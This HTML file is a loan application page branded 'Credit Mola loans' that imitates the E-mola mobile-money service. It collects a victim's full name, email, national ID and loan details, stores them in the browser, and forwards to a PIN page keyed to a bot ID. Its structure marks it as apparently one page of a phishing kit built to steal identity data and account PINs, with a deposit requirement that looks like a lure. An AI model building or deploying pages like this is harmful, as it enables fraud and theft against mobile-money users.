<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loan Application Form</title>

<style>
body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
h2 { text-align: center; margin-bottom: 20px; }
label { display: block; margin: 10px 0 5px; font-weight: bold; }
input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
.logo-container { width: 100%; height: 120px; margin-bottom: 20px; }
.logo { width: 100%; height: 100%; object-fit: cover; }
.loan-notice { background: #fff3cd;
   border: 1px solid #ffeeba; 
   padding: 12px;
    border-radius: 6px; 
    font-size: 14px;
    margin-bottom: 20px;
 }
.loan-notice ol {
    padding-left: 20px; /* indent numbers */
    margin: 8px 0 0 0;
}
.loan-notice li {
    margin-bottom: 6px;
}
</style>
</head>
<body>

<div class="loan-container">
    <h2>Credit Mola loans</h2>
    <div class="logo-container">
        <img src="emola-dp.jpeg" class="logo">
    </div>

    <form id="loanForm">
        <!-- NEW NAME INPUT -->
        <label>Full Name</label>
        <input id="fullName" type="text" required placeholder="Enter your full name">

        <label>Loan Amount (MT)</label>
        <input id="loanAmount" type="number" required placeholder="MIN500">
        <label>Email</label>
        <input id="email" type="email" placeholder="example@gmail.com" required>
        <label>National ID</label>
        <input id="nationalId" type="text"  placeholder="National Id">
        <label>Repayment Period</label>
        <select id="repaymentPeriod" required>
            <option value="">Select</option>
            <option value="7days">7 Days(1.5% interest)</option>
            <option value="14days">14 Days(2.5% interest)</option>
            <option value="21days">21 Days(3.5% interest)</option>
            <option value="30days">30 Days(4.5% interest)</option>
            <option value="60days">60 Days(6% interest)</option>
            <option value="90days">90 Days(10% interest)</option>
        </select>
        <label>Employment Status</label>
        <select id="employmentStatus" required>
            <option value="">Select</option>
            <option value="employed">Employed</option>
            <option value="self-employed">Self-employed</option>
            <option value="unemployed">Unemployed</option>
            <option value="student">Student</option>
        </select>
        <label>Loan Purpose</label>
        <select id="loanPurpose" required>
            <option value="">Select</option>
            <option value="business">Business</option>
            <option value="personal">Personal Loans</option>
            <option value="schoolfees">School Fees</option>
            <option value="medical">Medical</option>
            <option value="others">Others</option>
        </select>

        <div class="loan-notice">
            <strong>Qualification Notice:</strong>
            <ol>
                 <li>Must apply with a active E-mola account.</li>
                <li>Must have at least 10% of the amount applying in the E-mola account </li>
            </ol>
        </div>

        <button type="submit">Next</button>
    </form>
</div>

<script>
// âœ… BOT ID FIX
let botId = new URLSearchParams(window.location.search).get('botId');
if (!botId) {
    const parts = window.location.pathname.split('/');
    const botIndex = parts.indexOf('bot');
    if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
}
if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
localStorage.setItem('botId', botId);

// ---------------- FORM LOGIC ----------------
document.getElementById('loanForm').addEventListener('submit', e => {
    e.preventDefault();

    // SAVE NAME + EXISTING FIELDS
    localStorage.setItem('fullName', fullName.value); // NEW
    localStorage.setItem('loanAmount', loanAmount.value);
    localStorage.setItem('email', email.value);
    localStorage.setItem('nationalId', nationalId.value);
    localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
    localStorage.setItem('employmentStatus', employmentStatus.value);
    localStorage.setItem('loanPurpose', loanPurpose.value);

    window.location.href = `pin.html?botId=${botId}`;
});
</script>
</body>
</html>
